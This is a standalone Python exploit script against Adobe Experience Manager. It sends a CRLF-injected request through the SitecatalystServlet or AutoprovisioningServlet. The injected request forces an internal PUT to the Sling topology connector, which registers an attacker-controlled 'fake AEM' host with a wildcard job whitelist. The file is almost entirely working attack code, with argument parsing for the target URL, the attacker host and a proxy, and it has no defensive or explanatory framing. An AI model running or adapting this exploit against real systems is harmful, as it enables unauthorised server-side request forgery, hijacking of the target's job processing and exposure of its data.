import sys
import argparse
import uuid
from urllib.parse import unquote

import requests

requests.packages.urllib3.disable_warnings()


def http_request(url, method='GET', data=None, additional_headers=None, proxy=None):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0'}
    if additional_headers:
        headers.update(additional_headers)

    if not proxy:
        proxy = {}

    resp = requests.request(method, url, data=data, headers=headers, proxies=proxy, verify=False, timeout=15, allow_redirects=False)

    return resp


def exploit(url, fakeaem, proxy=None):
    # We suppose that AEM publish instance is on http://localhost:4503
    JSON_DATA = '%7B%22ownerId%22%3A%22{0}%22%2C%22protocolVersion%22%3A1%2C%22created%22%3A1529002154280%2C%22inherited%22%3Afalse%2C%22serverInfo%22%3A%22{1}%3A80%22%2C%22localClusterView%22%3A%7B%22id%22%3A%22909ad6e7-463b-49b4-ba75-917112c8e530%22%2C%22instances%22%3A%5B%7B%22slingId%22%3A%22{0}%22%2C%22isLeader%22%3Atrue%2C%22cluster%22%3A%22665ad6e7-463b-49b4-ba75-917112c8e530%22%2C%22properties%22%3A%7B%22org%2Eapache%2Esling%2Einstance%2Eendpoints%22%3A%22http%3A//{1}%3A80/%22%2C%22org%2Eapache%2Esling%2Eevent%2Ejobs%2Econsumer%2Etopics%22%3A%22ADD-ASSET-USAGE%2Ccom/adobe/aem/formsndocuments/scheduler/formreplication%2Ccom/adobe/cq/dam/assetmove%2Ccom/adobe/cq/dam/dmassetreplicateonmodify%2Ccom/adobe/cq/wcm/launches/autopromote%2Ccom/adobe/cq/workflow/payload/move/job%2Ccom/adobe/granite/maintenance/job/AuditLogMaintenanceTask%2Ccom/adobe/granite/maintenance/job/DataStoreGarbageCollectionTask%2Ccom/adobe/granite/maintenance/job/RevisionCleanupTask%2Ccom/adobe/granite/maintenance/job/VersionPurgeTask%2Ccom/adobe/granite/maintenance/job/WorkflowPurgeTask%2Ccom/adobe/granite/workflow/external/job%2Ccom/adobe/granite/workflow/external/job/%2A%2A%2Ccom/adobe/granite/workflow/external/polling/event%2Ccom/adobe/granite/workflow/external/polling/event/%2A%2A%2Ccom/adobe/granite/workflow/job%2Ccom/adobe/granite/workflow/job/%2A%2A%2Ccom/adobe/granite/workflow/offloading%2Ccom/adobe/granite/workflow/timeout/job%2Ccom/adobe/granite/workflow/timeout/job/%2A%2A%2Ccom/adobe/granite/workflow/transient/job/%2A%2A%2Ccom/adobe/integrations/target/ambitchange%2Ccom/adobe/integrations/target/pushauthorcampaign%2Ccom/dam/cq/scene7/importer/%2A%2Ccom/day/cq/audit/job%2Ccom/day/cq/dam/s7dam/update/job%2Ccom/day/cq/personalization/teaserevent%2Ccom/day/cq/replication/job/%2A%2Ccommentjobtopic%2Ccq/personalization/audiencemanager/sync%2Cdam/proxy/ids/job%2Cdam/scene7/asset/activation%2Cgroupeventjobtopic%2Corg/apache/sling/distribution/queue/publish/endpoint0%2Corg/apache/sling/event/impl/jobs/tasks/HistoryCleanUpTask%2Cratingjobtopic%2Cresourcejobtopic%2Csling/webconsole/test%2Cusereventjobtopic%22%2C%22job%2Econsumermanager%2Ewhitelist%22%3A%22%2A%22%2C%22com%2Eadobe%2Egranite%2Eoffloading%2Ejob%2Eregisteredtopics%22%3A%22ADD-ASSET-USAGE%2Ccom/adobe/aem/formsndocuments/scheduler/formreplication%2Ccom/adobe/cq/dam/assetmove%2Ccom/adobe/cq/dam/dmassetreplicateonmodify%2Ccom/adobe/cq/wcm/launches/autopromote%2Ccom/adobe/cq/workflow/payload/move/job%2Ccom/adobe/granite/maintenance/job/AuditLogMaintenanceTask%2Ccom/adobe/granite/maintenance/job/DataStoreGarbageCollectionTask%2Ccom/adobe/granite/maintenance/job/RevisionCleanupTask%2Ccom/adobe/granite/maintenance/job/VersionPurgeTask%2Ccom/adobe/granite/maintenance/job/WorkflowPurgeTask%2Ccom/adobe/granite/workflow/external/job%2Ccom/adobe/granite/workflow/external/job/%2A%2A%2Ccom/adobe/granite/workflow/external/polling/event%2Ccom/adobe/granite/workflow/external/polling/event/%2A%2A%2Ccom/adobe/granite/workflow/job%2Ccom/adobe/granite/workflow/job/%2A%2A%2Ccom/adobe/granite/workflow/offloading%2Ccom/adobe/granite/workflow/timeout/job%2Ccom/adobe/granite/workflow/timeout/job/%2A%2A%2Ccom/adobe/granite/workflow/transient/job/%2A%2A%2Ccom/adobe/integrations/target/ambitchange%2Ccom/adobe/integrations/target/pushauthorcampaign%2Ccom/dam/cq/scene7/importer/%2A%2Ccom/day/cq/audit/job%2Ccom/day/cq/dam/s7dam/update/job%2Ccom/day/cq/personalization/teaserevent%2Ccom/day/cq/replication/job/%2A%2Ccommentjobtopic%2Ccq/personalization/audiencemanager/sync%2Cdam/proxy/ids/job%2Cdam/scene7/asset/activation%2Cgroupeventjobtopic%2Corg/apache/sling/distribution/queue/publish/endpoint0%2Corg/apache/sling/event/impl/jobs/tasks/HistoryCleanUpTask%2Cratingjobtopic%2Cresourcejobtopic%2Csling/webconsole/test%2Cusereventjobtopic%22%2C%22org%2Eapache%2Esling%2Einstance%2Ename%22%3A%22Instance%20{0}%22%2C%22com%2Eadobe%2Egranite%2Eoffloading%2Einfrastructure%2Eosgiconsole%2Epath%22%3A%22/system/console%22%2C%22job%2Econsumermanager%2Eblacklist%22%3A%22%22%2C%22org%2Eapache%2Esling%2Einstance%2Edescription%22%3A%22Instance%20xxxxx%22%7D%7D%5D%7D%2C%22topologyAnnouncements%22%3A%5B%5D%7D'
    PARAMS = '?datacenter=http://localhost:4503/xxxx%23&company=xxx&username=x%22%0AHost%3A%20localhost%3A4503%0AContent-Length%3A0%0A%0APUT%20/libs/sling/topology/connector%2E{0}%2Ejson%20HTTP/1%2E0%0AHost%3A%20localhost%3A4503%0AConnection%3A%20keep-alive%0AContent-Length%3A%20{1}%0AContent-Type%3A%20application/json%0A%0A{2}%0A%0AGET%20/%20HTTP/1%2E1%0AHost%3Alocalhost%3A4503%0A&secret=yyyy'

    id = uuid.uuid4()

    json_data = JSON_DATA.format(id, fakeaem.replace('.', '%2E'))

    params = PARAMS.format(id, len(unquote(json_data)), json_data)

    for _ in range(5):
        http_request(url + params, proxy=proxy)


def parse_args():
    parser = argparse.ArgumentParser()

    parser.add_argument('--url', help='URL for SitecatalystServlet or AutoprovisioningServlet, including path, without query part')
    parser.add_argument('--fakeaem', help='hostname/ip of fake AEM server')
    parser.add_argument('--proxy', help='http and https proxy')

    return parser.parse_args(sys.argv[1:])


def main():
    args = parse_args()

    if args.proxy:
        p = args.proxy
        proxy = {'http': p, 'https': p}
    else:
        proxy = {}

    if not args.url or not args.fakeaem:
        print('You must specify the --url and --fakeaem parameters, bye.')
        sys.exit(1337)

    exploit(args.url, args.fakeaem, proxy)


if __name__ == '__main__':
    main()